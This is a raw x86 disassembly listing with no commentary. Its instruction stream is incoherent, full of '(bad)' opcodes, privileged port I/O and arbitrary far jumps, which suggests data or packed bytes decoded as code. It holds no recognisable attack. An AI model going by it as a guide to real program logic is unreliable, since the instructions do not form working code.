  4265bc:	popf   
  4265bd:	xchg   ebp,eax
  4265be:	sub    DWORD PTR [edi-0x750c81a],ecx
  4265c4:	cmp    al,0x6c
  4265c6:	ja     0x42662a
  4265c8:	imul   eax,DWORD PTR [ecx-0x35],0x2cc2a754
  4265cf:	fadd   st,st(2)
  4265d1:	(bad)
  4265d4:	pushf  
  4265d5:	ins    DWORD PTR es:[edi],dx
  4265d6:	mov    cl,0x7e
  4265d8:	ror    DWORD PTR [edi+0x72],1
  4265db:	ret    0x631b
  4265de:	inc    eax
  4265df:	ins    BYTE PTR es:[edi],dx
  4265e0:	jno    0x4265bd
  4265e2:	ss jae 0x42663b
  4265e5:	jno    0x4265ec
  4265e7:	rcr    ebp,1
  4265e9:	add    DWORD PTR [ecx+0x7],0x66
  4265ed:	scas   eax,DWORD PTR es:[edi]
  4265ee:	sub    eax,0x72ded09e
  4265f3:	inc    esi
  4265f4:	mov    ds:0x31eb6294,eax
  4265f9:	popf   
  4265fa:	sbb    BYTE PTR [esi+ebp*1],al
  4265fd:	inc    edx
  4265fe:	rcr    DWORD PTR [eax-0x220e8372],1
  426604:	and    edx,edi
  426606:	cmp    eax,0x920a23a2
  42660b:	mov    ebp,0xffd4040e
  426610:	dec    ebp
  426611:	jae    0x4265e9
  426613:	rcl    BYTE PTR [ebp-0x5aebac9c],0xa
  42661a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42661b:	mov    dh,0x2e
  42661d:	mov    dh,0x9
  42661f:	adc    DWORD PTR [edx-0x6de2bb40],eax
  426625:	leave  
  426626:	clc    
  426627:	cmc    
  426628:	or     ecx,DWORD PTR [eax]
  42662a:	lahf   
  42662b:	pop    ds
  42662c:	lahf   
  42662d:	(bad)  
  42662e:	retf   0xe951
  426631:	add    BYTE PTR [esp+ecx*2-0x6f],bh
  426635:	cmp    DWORD PTR [eax+0x44],ebp
  426638:	or     BYTE PTR [edi-0x22bac0dd],0x6e
  42663f:	inc    edx
  426640:	repz out dx,al
  426642:	pusha  
  426643:	inc    esp
  426644:	ficom  DWORD PTR [eax-0x6b881374]
  42664a:	xlat   BYTE PTR ds:[ebx]
  42664b:	cli    
  42664c:	inc    edi
  42664d:	lahf   
  42664e:	sbb    al,0x7f
  426650:	fwait
  426651:	cld    
  426652:	sbb    esi,DWORD PTR [eax+0x1550acc1]
  426658:	mov    eax,ds:0x598c3a0
  42665d:	mov    ds:0x112a90e6,al
  426662:	pushf  
  426663:	stos   DWORD PTR es:[edi],eax
  426664:	mov    ds:0xbf25a36b,al
  426669:	mov    edi,0x82d0a9f1
  42666e:	(bad)  
  42666f:	imul   esi,DWORD PTR [ecx],0x3b0f3c7f
  426675:	hlt    
  426676:	cs leave 
  426678:	mov    ds:0xa84bd91c,eax
  42667d:	ds (bad) 
  42667f:	pop    esp
  426680:	dec    ebx
  426681:	data16 cmp al,0x56
  426684:	in     al,0xf5
  426686:	add    al,0xb7
  426688:	scas   al,BYTE PTR es:[edi]
  426689:	add    dl,dh
  42668b:	test   al,0xce
  42668d:	loopne 0x4266ea
  42668f:	mov    al,0xc5
  426691:	sub    al,0xbb
  426693:	mov    eax,0xbe808819
  426698:	mov    ss,WORD PTR [edi-0x55]
  42669b:	ins    DWORD PTR es:[edi],dx
  42669c:	dec    esi
  42669d:	xor    dl,BYTE PTR [esi-0x6d]
  4266a0:	loop   0x4266f0
  4266a2:	leave  
  4266a3:	xor    ecx,ecx
  4266a5:	clc    
  4266a6:	loopne 0x4266a1
  4266a8:	fistp  QWORD PTR [edi+0x78]
  4266ab:	and    eax,0x7e8a95d
  4266b0:	fwait
  4266b1:	pop    ss
  4266b2:	sub    BYTE PTR [eax],0x74
  4266b5:	imul   esi,eax,0xda986948
  4266bb:	dec    eax
  4266bc:	push   ecx
  4266bd:	into   
  4266be:	aam    0x48
  4266c0:	cmp    ebp,esp
  4266c2:	arpl   WORD PTR [ebx+0x5f],bx
  4266c5:	pusha  
  4266c6:	cmp    eax,0xc9c710e3
  4266cb:	inc    eax
  4266cc:	add    cl,dl
  4266ce:	(bad)  
  4266d0:	mov    ah,0x50
  4266d2:	fwait
  4266d3:	aam    0xa7
  4266d5:	xor    esp,DWORD PTR [edi+0x67]
  4266d8:	test   al,0xe6
  4266da:	or     al,0xd4
  4266dc:	les    ebp,FWORD PTR [ecx+0x52]
  4266df:	shr    BYTE PTR [eax-0x5f],0xe1
  4266e3:	adc    eax,DWORD PTR [ebx-0x3f]
  4266e6:	sub    ah,BYTE PTR [ebx]
  4266e8:	sbb    ebx,eax
  4266ea:	cwde   
  4266eb:	inc    eax
  4266ec:	(bad)  
  4266ed:	int    0xbd
  4266ef:	xchg   bl,ah
  4266f1:	ret    
  4266f2:	ficom  WORD PTR [edi]
  4266f4:	leave  
  4266f5:	add    BYTE PTR [esi+0x255dff1e],cl
  4266fb:	sbb    eax,edi
  4266fd:	gs fdiv st(0),st
  426700:	mov    ebp,0x4f4026aa
  426705:	and    al,0x7f
  426707:	(bad)  
  426708:	pop    ds
  426709:	loopne 0x4266bf
  42670b:	mov    eax,ds:0x6ff79b45
  426710:	sub    ebx,ecx
  426712:	fistp  QWORD PTR [esp+ebp*1+0x220866d4]
  426719:	fs (bad) 
  42671c:	js     0x426764
  42671e:	enter  0x55df,0x67
  426722:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426723:	cmp    DWORD PTR [eax-0x3d0c15bc],0x1d
  42672a:	getsec 
  42672c:	push   0x2e
  42672e:	scas   eax,DWORD PTR es:[edi]
  42672f:	repz mov esp,0xb38f286d
  426735:	cmp    eax,eax
  426737:	popf   
  426738:	push   0xf9854594
  42673d:	xchg   ebx,eax
  42673e:	arpl   WORD PTR [ebp-0x44986641],dx
  426744:	mov    bh,bh
  426746:	fdivp  st(2),st
  426748:	push   edx
  426749:	pusha  
  42674a:	xchg   edi,eax
  42674b:	hlt    
  42674c:	and    al,0x9f
  42674e:	mov    dl,0x5e
  426750:	or     bl,bh
  426752:	mov    bl,0x73
  426754:	dec    ecx
  426755:	hlt    
  426756:	sti    
  426757:	push   edi
  426758:	pusha  
  426759:	je     0x4267a4
  42675b:	cld    
  42675c:	mov    esp,ss
  42675e:	popf   
  42675f:	mov    ebp,0x2870b044
  426764:	push   ss
  426765:	ds push es
  426767:	sbb    BYTE PTR [edx],dh
  426769:	sub    esi,DWORD PTR [edx+ecx*1]
  42676c:	adc    BYTE PTR [eax],bl
  42676e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42676f:	sti    
  426770:	cmp    eax,0xeb3e7268
  426775:	mov    ss,WORD PTR [esi+0x143399ba]
  42677b:	sub    bh,bh
  42677d:	scas   eax,DWORD PTR es:[edi]
  42677e:	clc    
  42677f:	push   ebp
  426780:	lock push es
  426782:	jecxz  0x426742
  426784:	push   ebp
  426785:	je     0x4267e4
  426787:	fwait
  426788:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426789:	jl     0x426802
  42678b:	(bad)  
  42678c:	popf   
  42678d:	shr    ebp,0xa2
  426790:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426791:	mov    edx,0xa55837c1
  426796:	add    eax,DWORD PTR [edi-0x619647ce]
  42679c:	and    al,0x2e
  42679e:	or     BYTE PTR [eax+0x1f8c7dae],bl
  4267a4:	jb     0x426790
  4267a6:	in     al,dx
  4267a7:	push   edi
  4267a8:	xchg   ebx,eax
  4267a9:	inc    ecx
  4267aa:	or     edx,esi
  4267ac:	sbb    eax,0x8de89773
  4267b1:	push   esi
  4267b2:	xchg   esi,eax
  4267b3:	and    DWORD PTR [ecx-0x7ed40607],eax
  4267b9:	std    
  4267ba:	lds    ebp,FWORD PTR [esi-0x56]
  4267bd:	mov    ?,edi
  4267bf:	shl    BYTE PTR ds:0x32007d29,0xe0
  4267c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4267c7:	ror    ebx,0x7e
  4267ca:	jmp    FWORD PTR [edx-0x41034d94]
  4267d0:	jmp    0x4267b7
  4267d2:	dec    ebp
  4267d3:	mov    esp,0x33b11725
  4267d8:	jae    0x426778
  4267da:	imul   edi,DWORD PTR [edi],0xbdfbd50f
  4267e0:	popa   
  4267e1:	sbb    dl,bl
  4267e3:	inc    eax
  4267e4:	cmp    BYTE PTR [esi],cl
  4267e6:	and    cl,al
  4267e8:	cli    
  4267e9:	push   0x49
  4267eb:	and    al,0x8e
  4267ed:	xor    eax,0xea425d4
  4267f2:	pop    esi
  4267f3:	inc    ecx
  4267f4:	lods   al,BYTE PTR ds:[esi]
  4267f5:	ss in  eax,dx
  4267f7:	push   ds
  4267f8:	pop    ecx
  4267f9:	aaa    
  4267fa:	or     ch,BYTE PTR [edi-0x9]
  4267fd:	(bad)  [eax]
  4267ff:	sbb    DWORD PTR ds:0xd2e1ffb2,ebx
  426805:	pusha  
  426806:	adc    eax,0x869ae010
  42680b:	xor    eax,DWORD PTR [ebp-0x40]
  42680e:	iret   
  42680f:	add    eax,0x85fa119a
  426814:	jbe    0x4267a8
  426816:	push   edi
  426817:	test   eax,0xc4bd6e4c
  42681c:	clc    
  42681d:	shl    ah,cl
  42681f:	sub    eax,0x2489707d
  426824:	fdivr  DWORD PTR [esi-0x49]
  426827:	mov    bh,0x84
  426829:	sub    ch,BYTE PTR [edx]
  42682b:	arpl   ax,di
  42682d:	sbb    ah,BYTE PTR [eax-0x3e]
  426830:	cdq    
  426831:	push   ebx
  426832:	push   cs
  426833:	inc    ebp
  426834:	adc    bh,BYTE PTR [edi+0x2f24aea0]
  42683a:	lods   eax,DWORD PTR ds:[esi]
  42683b:	fwait
  42683c:	dec    ebp
  42683d:	outs   dx,BYTE PTR ds:[esi]
  42683e:	into   
  42683f:	ins    BYTE PTR es:[edi],dx
  426840:	sbb    bl,BYTE PTR [ebx+0x72]
  426843:	jns    0x4267cd
  426845:	les    ebx,FWORD PTR [eax]
  426847:	pushf  
  426848:	retf   
  426849:	neg    esp
  42684b:	int    0x1f
  42684d:	push   es
  42684e:	or     eax,0xc0524387
  426853:	xchg   ecx,eax
  426854:	mov    ch,0xeb
  426856:	fimul  WORD PTR [eax+0x1dd311dc]
  42685c:	adc    eax,0x211ed83a
  426861:	cmp    bl,BYTE PTR [ecx-0x47a493e8]
  426867:	cmp    ah,BYTE PTR [edx+0x48]
  42686a:	push   0xffffffb1
  42686c:	xlat   BYTE PTR ds:[ebx]
  42686d:	popf   
  42686e:	cli    
  42686f:	dec    esi
  426870:	ror    BYTE PTR [edi],0x1a
  426873:	mov    ebp,0xaf
	...
  426880:	add    cl,al
  426882:	into   
  426883:	psrld  mm1,QWORD PTR [edi]
  426886:	rcr    ebp,cl
  426888:	fistp  QWORD PTR [ebp+edi*8+0x37]
  42688c:	push   esp
  42688d:	test   cl,al
  42688f:	pop    ecx
  426890:	pop    ebp
  426891:	add    edi,ebx
  426893:	add    DWORD PTR [eax],eax
  426895:	lods   al,BYTE PTR ds:[esi]
  426896:	add    eax,DWORD PTR [eax]
  426898:	add    BYTE PTR [esi],dh
  42689a:	dec    ebx
  42689b:	icebp  
  42689c:	sysenter 
  42689e:	or     al,0x87
  4268a0:	mov    bl,BYTE PTR [ebx]
  4268a2:	sub    bl,ah
  4268a4:	or     al,0xd3
  4268a6:	out    0x75,eax
  4268a8:	repz out 0x24,al
  4268ab:	pop    es
  4268ac:	inc    edi
  4268ad:	inc    esp
  4268ae:	aam    0x10
  4268b0:	cmp    cl,ah
  4268b2:	fcom   QWORD PTR [eax-0x6f0fd9bf]
  4268b8:	call   0xee0773ac
  4268bd:	ds inc eax
  4268bf:	icebp  
  4268c0:	add    eax,0x8e3c24bd
  4268c5:	dec    eax
  4268c6:	push   esp
  4268c7:	jge    0x426932
  4268c9:	or     ebx,esp
  4268cb:	mov    edi,0x7f960243
  4268d0:	shl    BYTE PTR [edi],1
  4268d2:	in     al,0x17
  4268d4:	push   es
  4268d5:	loope  0x4268e0
  4268d7:	fcom   DWORD PTR ds:[edi+0x43]
  4268db:	icebp  
  4268dc:	inc    DWORD PTR [edi+0x2c]
  4268df:	inc    edi
  4268e0:	out    dx,eax
  4268e1:	jno    0x426959
  4268e3:	scas   eax,DWORD PTR es:[edi]
  4268e4:	call   0x53fc:0x5f9f99f7
  4268eb:	add    al,0x67
  4268ed:	mov    ecx,0x50cc2cd1
  4268f2:	adc    eax,0x839457ed
  4268f7:	aad    0x91
  4268f9:	lds    esp,FWORD PTR [ebp+0x63f82010]
  4268ff:	data16 mov al,dh
  426902:	aad    0xd5
  426904:	mov    ds:0x123b6c5b,eax
  426909:	rcl    DWORD PTR [edi-0x30],1
  42690c:	jecxz  0x42691c
  42690e:	test   BYTE PTR [ebx+0x77],0xf7
  426912:	adc    cl,cl
  426914:	in     al,dx
  426915:	cdq    
  426916:	xchg   esp,eax
  426917:	push   edx
  426918:	iret   
  426919:	repz imul BYTE PTR [edi-0x72e7f92d]
  426920:	aad    0x47
  426922:	pop    ds
  426923:	xor    BYTE PTR [ebx+0x1d],cl
  426926:	add    edx,ebx
  426928:	inc    esp
  426929:	pop    esp
  42692a:	pop    ds
  42692b:	fsub   st,st(0)
  42692d:	stos   DWORD PTR es:[edi],eax
  42692e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42692f:	mov    ebp,0x1af7d5b1
  426934:	jecxz  0x4268da
  426936:	test   BYTE PTR [eax-0x10e3e07a],bl
  42693c:	fs std 
  42693e:	stos   BYTE PTR es:[edi],al
  42693f:	pop    eax
  426940:	sbb    DWORD PTR [eax+eiz*8],0xffffffd9
  426944:	xor    ebp,DWORD PTR [edi]
  426946:	les    ebx,FWORD PTR [edi-0x3d157e7a]
  42694c:	mov    ecx,0xd8af4cb7
  426951:	cmp    al,BYTE PTR [ebp-0x6ae25310]
  426957:	inc    ebp
  426958:	ss test al,cl
  42695b:	call   0x54:0xb288e960
  426962:	pop    eax
  426963:	dec    ebx
  426964:	mov    ebx,0xff12a66b
  426969:	lock jo 0x426956
  42696c:	ret    0xd895
  42696f:	push   0xffffff98
  426971:	xor    dh,ah
  426973:	mov    edi,0x8bbee68e
  426978:	retf   
  426979:	test   dl,bh
  42697b:	add    DWORD PTR [ebx-0x54d7068d],0xffffffa9
  426982:	mov    ch,0xf2
  426984:	mov    DWORD PTR [esp+ebp*2-0x37aaecfe],edx
  42698b:	xlat   BYTE PTR ds:[ebx]
  42698c:	rcr    BYTE PTR [edx],cl
  42698e:	mov    bl,0xb5
  426990:	adc    BYTE PTR [esi+0x78728d01],0x3d
  426997:	pop    es
  426998:	gs sbb bl,al
  42699b:	dec    edi
  42699c:	retf   0xbb0a
  42699f:	xchg   edi,eax
  4269a0:	stos   DWORD PTR es:[edi],eax
  4269a1:	pop    esi
  4269a2:	jmp    0xcea20fe
  4269a7:	and    cl,BYTE PTR [edx+0x4b]
  4269aa:	push   esi
  4269ab:	adc    BYTE PTR [edx*4+0x10ec0007],0x5a
  4269b3:	xor    eax,0xf800c107
  4269b8:	fidiv  WORD PTR [edx+0x5f1dcdfd]
  4269be:	push   es
  4269bf:	or     eax,0xcb5c3984
  4269c4:	retf   0x7ea3
  4269c7:	cmp    esi,DWORD PTR [ebp+0x78]
  4269ca:	pop    esi
  4269cb:	cli    
  4269cc:	pop    ds
  4269cd:	in     al,dx
  4269ce:	out    dx,eax
  4269cf:	xor    cl,al
  4269d1:	jnp    0x426971
  4269d3:	add    eax,0x58c07aa
  4269d8:	fcmovne st,st(3)
  4269da:	pop    esp
  4269db:	pop    ebx
  4269dc:	pop    ebp
  4269dd:	ret    0xd009
  4269e0:	inc    esp
  4269e1:	mov    bl,0x43
  4269e3:	ret    
  4269e4:	imul   ecx,DWORD PTR [eax-0x33],0xffffff8c
  4269e8:	ror    ch,cl
  4269ea:	loope  0x426a2e
  4269ec:	inc    ebp
  4269ed:	add    eax,DWORD PTR [edi-0x36]
  4269f0:	push   eax
  4269f1:	xor    eax,eax
  4269f3:	cmp    DWORD PTR [eax-0x1b],ebp
  4269f6:	dec    ecx
  4269f7:	mov    ?,WORD PTR [ebx-0x5f]
  4269fa:	popf   
  4269fb:	fs mov cl,0x6
  4269fe:	lds    ecx,FWORD PTR [edi-0x3b]
  426a01:	inc    ecx
  426a02:	cmp    eax,0x86a3bc85
  426a07:	xchg   edi,eax
  426a08:	(bad)  
  426a09:	das    
  426a0a:	sub    DWORD PTR [ebp-0x1d7353e6],esp
  426a10:	mov    WORD PTR [esi-0x6a05f001],ss
  426a16:	in     eax,0x51
  426a18:	cs sbb al,0xd2
  426a1b:	push   es
  426a1c:	and    al,BYTE PTR [ebp+0x51b91277]
  426a22:	xor    DWORD PTR [edi+0x49],0xbfe47b77
  426a29:	and    dh,BYTE PTR [edi-0x32]
  426a2c:	lock ret 
  426a2e:	ret    
  426a2f:	std    
  426a30:	add    eax,0x58a169da
  426a35:	pop    ecx
  426a36:	test   al,0x84
  426a38:	je     0x4269f3
  426a3a:	(bad)  
  426a3b:	loopne 0x4269eb
  426a3d:	push   cs
  426a3e:	fs inc esi
  426a40:	(bad)  
  426a41:	cdq    
  426a42:	pop    eax
  426a43:	xchg   ebp,eax
  426a44:	push   cs
  426a45:	xor    BYTE PTR [ebp-0x80],ch
  426a48:	sub    edi,DWORD PTR [edi]
  426a4a:	dec    edx
  426a4b:	dec    ebp
  426a4c:	dec    DWORD PTR [ecx-0x2e]
  426a4f:	mov    ds:0x73eec0fd,al
  426a54:	inc    edx
  426a55:	xchg   edi,edx
  426a57:	retf   0x6471
  426a5a:	add    al,0xff
  426a5c:	mul    ecx
  426a5e:	int    0x93
  426a60:	and    ah,BYTE PTR [edx-0x42]
  426a63:	cmp    DWORD PTR [edx+esi*4],ebx
  426a66:	loope  0x426a56
  426a68:	jno    0x426a71
  426a6a:	call   0x4f:0xf6885338
  426a71:	push   0xffffff9c
  426a73:	xchg   esi,eax
  426a74:	sar    BYTE PTR [esi],1
  426a76:	adc    edx,DWORD PTR [esi]
  426a78:	mov    ds,WORD PTR [ebx]
  426a7a:	pop    edx
  426a7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a7c:	test   al,0xcd
  426a7e:	cmp    dh,BYTE PTR [edi+0x2]
  426a81:	sahf   
  426a82:	in     al,dx
  426a83:	sub    eax,0x83764afb
  426a88:	cmp    ch,BYTE PTR [esi-0x28053086]
  426a8e:	jmp    0xc2a9802e
  426a93:	(bad)  
  426a94:	cdq    
  426a95:	sub    DWORD PTR [ebx],ebx
  426a97:	cmp    al,0x9a
  426a99:	in     eax,0x5b
  426a9b:	fcom   st(6)
  426a9d:	jmp    DWORD PTR [ebp-0x68]
  426aa0:	rcl    BYTE PTR [ebp-0x7c152704],0x81
  426aa7:	int    0xd
  426aa9:	out    dx,al
  426aaa:	pop    ecx
  426aab:	xchg   ecx,eax
  426aac:	pop    esp
  426aad:	mov    ch,0xd2
  426aaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426ab0:	jbe    0x426a76
  426ab2:	sbb    edi,DWORD PTR [ecx+0x1fd1f1ea]
  426ab8:	clc    
  426ab9:	(bad)  
  426abb:	out    0x9e,al
  426abd:	js     0x426aed
  426abf:	xchg   ebp,eax
  426ac0:	xor    BYTE PTR [edi+0x31763d1e],bl
  426ac6:	mov    ds:0x2245f29a,eax
  426acb:	dec    edi
  426acc:	cmp    dl,BYTE PTR [eax+0x16]
  426acf:	int    0xe4
  426ad1:	dec    esp
  426ad2:	jp     0x426aec
  426ad4:	ror    DWORD PTR [esi-0x6a],1
  426ad7:	outs   dx,DWORD PTR ds:[esi]
  426ad8:	sbb    DWORD PTR [edi+0x51],ebp
  426adb:	ss pop eax
  426add:	or     ch,0xb1
  426ae0:	jle    0x426a65
  426ae2:	mov    edx,0x29821289
  426ae7:	mov    ebx,fs
  426ae9:	repz retf 
  426aeb:	aad    0xb1
  426aed:	daa    
  426aee:	jbe    0x426b4b
  426af0:	xchg   ebx,eax
  426af1:	mov    edi,0x4328b12d
  426af6:	or     eax,0x3fa4c550
  426afb:	ins    BYTE PTR es:[edi],dx
  426afc:	or     eax,0xb0ce26fa
  426b01:	sbb    eax,0xc1038b23
  426b06:	std    
  426b07:	cmp    eax,0x164a9daf
  426b0c:	inc    esp
  426b0d:	test   al,0xce
  426b0f:	in     eax,0xc1
  426b11:	mov    bh,0xfc
  426b13:	sahf   
  426b14:	inc    ebx
  426b15:	xchg   DWORD PTR [edi+0x64],ebx
  426b18:	sti    
  426b19:	push   esp
  426b1a:	xchg   BYTE PTR [edx+0x7d],cl
  426b1d:	xchg   ebx,eax
  426b1e:	fld    DWORD PTR [edi+esi*1]
  426b21:	pop    es
  426b22:	add    cl,dl
  426b24:	jecxz  0x426ba4
  426b26:	adc    DWORD PTR [ebp-0x6e2e43dd],ebx
  426b2c:	cwde   
  426b2d:	jne    0x426b8d
  426b2f:	jnp    0x426b56
  426b31:	sub    BYTE PTR [ecx+0x742b5503],dh
  426b37:	pop    edi
  426b38:	sub    cl,al
  426b3a:	dec    edx
  426b3b:	mov    BYTE PTR [ecx],ch
  426b3d:	in     eax,0x5
  426b3f:	cld    
  426b40:	jns    0x426b80
  426b42:	pop    ebx
  426b43:	add    bl,dh
  426b45:	sahf   
  426b46:	sub    eax,0xc1b1aa87
  426b4b:	cld    
  426b4c:	test   BYTE PTR [ebx+edx*1+0x595fb46c],0x23
  426b54:	sbb    eax,0xedfa828d
  426b59:	cmp    BYTE PTR [esi-0x2],ah
  426b5c:	rcr    DWORD PTR [ebp+0x67dba1a9],0xc8
  426b63:	or     al,0x39
  426b65:	lods   al,BYTE PTR ds:[esi]
  426b66:	cmp    DWORD PTR [ecx-0x21],0xffffffff
  426b6a:	(bad)  
  426b6b:	adc    al,0xe
  426b6d:	and    BYTE PTR [eax+0x1021526f],bh
  426b73:	sbb    eax,0x64ee9cf7
  426b78:	mov    al,ds:0xcb56f2a6
  426b7d:	mov    al,0xdb
  426b7f:	xor    esp,DWORD PTR [ecx+0x37]
  426b82:	push   edi
  426b83:	(bad)  
  426b84:	cmp    esi,DWORD PTR [eax+0x6572c02b]
  426b8a:	push   ss
  426b8b:	dec    ebp
  426b8c:	pop    ss
  426b8d:	fwait
  426b8e:	sahf   
  426b8f:	sar    esi,0xf0
  426b92:	mov    eax,0x664e167b
  426b97:	pop    ebx
  426b98:	mov    ds:0xc2b4f0ed,eax
  426b9d:	mov    ch,0x0
  426b9f:	ds hlt 
  426ba1:	ret    
  426ba2:	mov    ds:0x8802ec61,al
  426ba7:	rcr    BYTE PTR [eax],0x93
  426baa:	ja     0x426bac
  426bac:	mov    dl,0x7f
  426bae:	jne    0x426c0a
  426bb0:	pop    esi
  426bb1:	icebp  
  426bb2:	pop    ecx
  426bb3:	jge    0x426b7b
  426bb5:	stc    
  426bb6:	aaa    
  426bb7:	push   ebx
  426bb8:	lock cmp BYTE PTR [ebx],cl
  426bbb:	add    ebp,DWORD PTR [ebx+0x70]
  426bbe:	sub    DWORD PTR [ebx+0x7fe82596],ecx
  426bc4:	cmp    ebp,DWORD PTR [ecx+0x6e]
  426bc7:	rcl    dh,0x7d
  426bca:	jno    0x426b88
  426bcc:	adc    eax,0xd03773c2
  426bd1:	sbb    bl,BYTE PTR [ecx]
  426bd3:	jmp    0xda2b:0x77141f38
  426bda:	adc    BYTE PTR fs:[ecx*2-0x3b6fd4bb],0xaa
  426be3:	or     bl,dh
  426be5:	cmp    cl,BYTE PTR [eax+0x58c3e299]
  426beb:	loope  0x426c0c
  426bed:	sub    ebp,DWORD PTR [ebx+0x78]
  426bf0:	jo     0x426b91
  426bf2:	popf   
  426bf3:	hlt    
  426bf4:	mov    edx,0x14180316
  426bf9:	push   edx
  426bfa:	in     eax,0x39
  426bfc:	dec    ebx
  426bfd:	in     al,0x6a
  426bff:	into   
  426c00:	sbb    bl,BYTE PTR [edi]
  426c02:	mov    esi,0x1c9b7050
  426c07:	xchg   ecx,edx
  426c09:	xor    eax,0xffffffa3
  426c0c:	or     cl,al
  426c0e:	jne    0x426c18
  426c10:	cmp    eax,0xe44f5851
  426c15:	xchg   edx,eax
  426c16:	inc    ebp
  426c17:	mov    DWORD PTR [esi-0x1ede7106],esi
  426c1d:	pop    es
  426c1e:	xchg   esp,eax
  426c1f:	cwde   
  426c20:	sub    DWORD PTR [ebp+0x3],0x1ac9152b
  426c27:	arpl   WORD PTR [ecx-0x78f4a657],cx
  426c2d:	icebp  
  426c2e:	and    DWORD PTR [edi],ebx
  426c30:	(bad)  
  426c31:	pop    ss
  426c32:	mov    gs,WORD PTR [edx+0x78f0425e]
  426c38:	jno    0x426c71
  426c3a:	sbb    BYTE PTR [edi+0x7ccfbe30],0x1
  426c41:	mov    BYTE PTR [ebx],cl
  426c43:	pop    edx
  426c44:	push   ecx
	...
  426c51:	lock lock pusha 
  426c54:	pushf  
  426c55:	pusha  
  426c56:	pushf  
  426c57:	cld    
  426c58:	cld    
  426c59:	push   es
  426c5a:	dec    edx
  426c5b:	lock cmp esi,eax
  426c5e:	add    DWORD PTR [ecx+0x1e2add4],esi
  426c64:	add    BYTE PTR [ebx+eax*1-0x5e090000],ch
  426c6b:	leave  
  426c6c:	lods   al,BYTE PTR ds:[esi]
  426c6d:	inc    edi
  426c6e:	stc    
  426c6f:	cmp    ah,BYTE PTR [ecx]
  426c71:	push   edx
  426c72:	lds    ebx,FWORD PTR [esp+eiz*2+0xe]
  426c76:	and    cl,bh
  426c78:	fisubr DWORD PTR [ebx]
  426c7a:	imul   ebp,DWORD PTR [ebx+ebp*4-0x1d760b96],0x242cd444
  426c85:	dec    eax
  426c86:	mov    DWORD PTR [ebx*4+0x270cca1d],esi
  426c8d:	push   edi
  426c8e:	xchg   edx,eax
  426c8f:	sbb    dh,bh
  426c91:	ret    
  426c92:	xchg   esi,eax
  426c93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426c94:	pop    ds
  426c95:	push   es
  426c96:	sbb    esp,edx
  426c98:	jge    0x426c4d
  426c9a:	xchg   ebx,eax
  426c9b:	hlt    
  426c9c:	outs   dx,BYTE PTR ds:[esi]
  426c9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426c9e:	fild   DWORD PTR [eax]
  426ca0:	mov    bh,bl
  426ca2:	xor    edx,esi
  426ca4:	mov    dl,0xaa
  426ca6:	sbb    eax,0x8fcc437c
  426cab:	imul   ecx,eax,0x7d59f4e0
  426cb1:	mov    dl,0xa9
  426cb3:	add    al,0xe9
  426cb5:	into   
  426cb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426cb7:	and    al,0xb8
  426cb9:	data16 arpl WORD PTR [ecx+ecx*8+0x52e69fc5],si
  426cc1:	jp     0x426d15
  426cc3:	xchg   ebx,eax
  426cc4:	xchg   ecx,eax
  426cc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426cc6:	(bad)  
  426cc7:	sbb    al,BYTE PTR [esi]
  426cc9:	jl     0x426c75
  426ccb:	out    dx,al
  426ccc:	inc    esp
  426ccd:	adc    ch,cl
  426ccf:	xchg   edx,eax
  426cd0:	cmp    eax,0x6c89129b
  426cd5:	inc    ecx
  426cd6:	lahf   
  426cd7:	retf   
  426cd8:	xchg   edi,eax
  426cd9:	push   edi
  426cda:	cmp    ebx,edx
  426cdc:	test   BYTE PTR [ebx+0x4a],cl
  426cdf:	sbb    DWORD PTR [edx-0x66fdd246],esi
  426ce5:	mov    DWORD PTR [edx+0x6ed89d6d],edi
  426ceb:	mov    bl,0xdd
  426ced:	add    ecx,DWORD PTR [ecx+0x5d]
  426cf0:	add    eax,0xe90c9817
  426cf5:	popa   
  426cf6:	lock or eax,0xdb13e56b
  426cfc:	jns    0x426d4b
  426cfe:	inc    esi
  426cff:	ficomp DWORD PTR [ecx-0x54e35e20]
  426d05:	daa    
  426d06:	pop    es
  426d07:	push   esi
  426d08:	dec    ebp
  426d09:	popf   
  426d0a:	lods   al,BYTE PTR ds:[esi]
  426d0b:	jmp    0x426cd8
  426d0d:	inc    ebx
  426d0e:	enter  0x45cd,0x7
  426d12:	mov    eax,edx
  426d14:	or     eax,esi
  426d16:	mov    WORD PTR [eax],es
  426d18:	push   es
  426d19:	mov    ch,0x85
  426d1b:	adc    al,0x37
  426d1d:	fwait
  426d1e:	inc    edi
  426d1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426d20:	xor    BYTE PTR [ebx-0x7a],ch
  426d23:	imul   esi,DWORD PTR [ebp+edx*1+0x52],0xdefb6fa1
  426d2b:	xor    al,0xae
  426d2d:	mov    ebx,0x5aabb7d4
  426d32:	bound  ebx,QWORD PTR [ebp-0x32]
  426d35:	retf   0x17b9
  426d38:	sbb    dh,cl
  426d3a:	repz lds ecx,FWORD PTR [esi]
  426d3d:	cmc    
  426d3e:	push   eax
  426d3f:	and    eax,0x44e4c1d8
  426d44:	cwde   
  426d45:	xchg   ch,ah
  426d47:	pop    edi
  426d48:	stos   DWORD PTR es:[edi],eax
  426d49:	aad    0xc6
  426d4b:	repz jge 0x426d19
  426d4e:	push   ebp
  426d4f:	xchg   esi,eax
  426d50:	mov    eax,0xffb7f9ca
  426d55:	je     0x426ce2
  426d57:	and    dh,BYTE PTR [eax]
  426d59:	mov    DWORD PTR [ecx],edi
  426d5b:	mov    cl,0xe1
  426d5d:	inc    esi
  426d5e:	xor    DWORD PTR [esi-0x7d],0x82eccfd3
  426d65:	inc    ecx
  426d66:	fiadd  WORD PTR ds:0xdf3c51d2
  426d6c:	inc    ebx
  426d6d:	jecxz  0x426d13
  426d6f:	(bad)  
  426d70:	push   esp
  426d71:	adc    cl,dl
  426d73:	das    
  426d74:	js     0x426cf7
  426d76:	loope  0x426da1
  426d78:	(bad)  
